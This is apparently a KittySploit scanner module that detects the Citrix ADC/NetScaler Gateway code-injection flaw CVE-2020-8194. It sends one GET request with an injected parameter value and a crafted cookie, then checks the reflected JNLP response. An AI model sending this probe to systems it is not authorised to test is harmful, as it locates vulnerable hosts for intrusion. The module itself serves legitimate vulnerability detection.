#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Citrix ADC and NetScaler Gateway are susceptible to remote code injection."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Citrix ADC and Citrix NetScaler Gateway - Remote Code Injection Detection',
        'description': 'Citrix ADC and NetScaler Gateway are susceptible to remote code injection. An attacker can potentially execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. Affected versions are before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18. Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allow modification of a file download.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'citrix', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://support.citrix.com/article/CTX276688',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8194',
            'https://github.com/Elsfa7-110/kenzer-templates',
            'https://github.com/SexyBeast233/SecBooks',
        ],
        'cve': 'CVE-2020-8194',
    }

    def run(self):
        path = '/menu/guiw?nsbrand=1&protocol=nonexistent.1337">&id=3&nsvpx=phpinfo'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'startupapp=st'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<jnlp codebase="nonexistent.1337">',)
        header_any = ('application/x-java-jnlp-file',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Citrix ADC and Citrix NetScaler Gateway - Remote Code Injection detected', path=path)
            return True
        return False

